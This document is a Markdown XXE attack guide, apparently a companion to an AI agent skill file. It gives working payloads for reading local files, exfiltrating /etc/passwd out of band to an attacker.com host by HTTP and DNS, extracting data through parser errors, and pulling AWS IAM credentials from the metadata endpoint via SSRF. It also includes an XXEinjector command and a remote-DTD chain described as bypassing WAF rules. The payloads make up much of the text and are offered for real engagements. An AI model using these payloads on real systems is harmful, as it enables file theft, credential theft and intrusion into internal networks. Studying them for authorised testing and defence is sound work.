# XXE Attack Techniques Guide

> Companion to `skills/web-xxe/SKILL.md`. This guide covers classic XXE file disclosure, blind XXE via OOB DNS/HTTP, error-based XXE, XXE to SSRF, and parameter entity exploitation using XXEinjector and Burp Collaborator.

---

## 1. Introduction

XML External Entity (XXE) injection exploits the XML specification's entity mechanism to read local files, access internal network services, and exfiltrate data. Every XML parser that processes DTDs (Document Type Definitions) and resolves external entities is potentially vulnerable. This guide walks through each attack technique from basic to advanced, providing practical payloads and tool-specific workflows for real-world penetration testing engagements.

---

## 2. Classic XXE File Disclosure

Classic XXE works when the application returns entity content in the HTTP response. This is the most straightforward exploitation path: inject an external entity pointing to a local file, and the parser resolves it, embedding the file content in the response XML.

### 2.1 Basic Payload Structure

The payload follows a consistent pattern: define a DOCTYPE with an ENTITY declaration referencing `file:///path`, then reference the entity with `&entityName;` in the XML body. The parser resolves the entity by reading the file and substituting its content. Test with `/etc/passwd` first (universally readable on Linux), then escalate to application-specific targets like `/app/.env`, `/var/www/html/config.php`, or `/proc/self/environ`.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<userInput>&xxe;</userInput>
```

### 2.2 Context-Specific Payloads

For SOAP endpoints, wrap the entity reference inside a SOAP body element. For REST APIs, match the expected XML structure. The entity reference can appear anywhere element text content is accepted. If the application expects specific root elements or namespaces, preserve those while injecting the DOCTYPE and entity reference.

```xml
<!-- SOAP endpoint -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <api:Request><api:Data>&xxe;</api:Data></api:Request>
  </soap:Body>
</soap:Envelope>
```

---

## 3. Blind XXE via OOB Channels

When the application does not reflect entity content in the response, switch to out-of-band (OOB) techniques. The core idea is to construct a multi-stage DTD where one entity reads the file and another entity sends the content to an attacker-controlled server.

### 3.1 HTTP-Based OOB

Host a DTD file on your server that defines a parameter entity chain: the first entity reads the target file, the second entity constructs an HTTP GET request with the file content as a query parameter. The target's XML parser fetches your DTD, processes the parameter entities, and makes an HTTP request back to your server carrying the exfiltrated data. Use `python3 -m http.server 80` or a custom handler to log incoming requests with their query parameters.

**Remote DTD** (hosted at `http://attacker.com/evil.dtd`):

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/exfil?d=%file;'>">
%eval;
%send;
```

### 3.2 DNS-Based OOB

When HTTP egress is filtered, DNS queries often still escape the network. Encode file content as DNS subdomain labels. The payload works identically to HTTP OOB but sends data via DNS resolution. Run an authoritative DNS server for your domain and log all queries to capture the exfiltrated subdomain data.

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://%file;.attacker.com/xxe'>">
%eval;
%send;
```

### 3.3 Using XXEinjector

XXEinjector automates blind XXE with built-in OOB handlers. Specify the exfiltration channel (`--oob=http|https|ftp|dns`), the target file, and your server address. The tool handles DTD hosting, payload generation, and data extraction. Use `--xml-embed` when the XML body must be embedded within existing XML structure, and `--output` to save results.

```bash
ruby XXEinjector.rb --host=attacker.com --file=/etc/passwd \
  --oob=http --verbose
```

### 3.4 Using Burp Collaborator

For quick blind XXE validation, use Burp Collaborator as the OOB server. Generate a Collaborator payload, embed it in an entity URL, and monitor the Collaborator tab for interactions. If the parser resolves the entity, you will see a DNS lookup and/or HTTP request from the target's IP address. This confirms XXE without needing external infrastructure.

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://UNIQUE_ID.burpcollaborator.net">
]>
<root>&xxe;</root>
```

---

## 4. Error-Based XXE

Error-based XXE extracts data through parser error messages. When the parser encounters an invalid URL or malformed XML after resolving an entity, the error message may include the entity's resolved content. This technique works when OOB channels are blocked but the application returns verbose error messages.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root>test</root>
```

The parser resolves `%file;` to the contents of `/etc/passwd`, then attempts to access `file:///nonexistent/[contents of /etc/passwd]`, which fails. The error message includes the invalid path, revealing the file contents.

---

## 5. XXE to SSRF

XXE can be used as an SSRF vector by pointing entity URLs to internal network addresses or cloud metadata endpoints. The XML parser makes the HTTP request on behalf of the attacker, bypassing network segmentation that blocks direct access.

```xml
<!-- AWS metadata extraction -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>&xxe;</root>
```

Combine with blind XXE techniques for SSRF when the response does not include entity content. The DTD chain reads the metadata endpoint response and exfiltrates it via OOB.

---

## 6. Parameter Entity Exploitation

Parameter entities (declared with `%`) are resolved within DTDs and enable the most powerful XXE attacks. Unlike general entities, parameter entities can load remote DTDs that define additional entities dynamically. This two-stage approach (local DTD loads remote DTD, remote DTD defines exfiltration entities) is essential for blind XXE and bypasses many WAF rules that only check for general entity patterns.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://attacker.com/payload.dtd">
  %remote;
]>
<root>test</root>
```

The remote DTD is free to define any entities needed for the attack, including reading files and constructing OOB exfiltration URLs. This separation between the initial payload (sent to the target) and the attack logic (loaded from attacker server) makes parameter entity exploitation both powerful and flexible.

---

## References

- PortSwigger Web Security Academy: https://portswigger.net/web-security/xxe
- OWASP XXE Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- XXEinjector: https://github.com/enjoiz/XXEinjector
- HackTricks XXE: https://book.hacktricks.xyz/pentesting-web/xxe-xee
- ARSW - XXE OOB Research: https://research.appsecco.com/
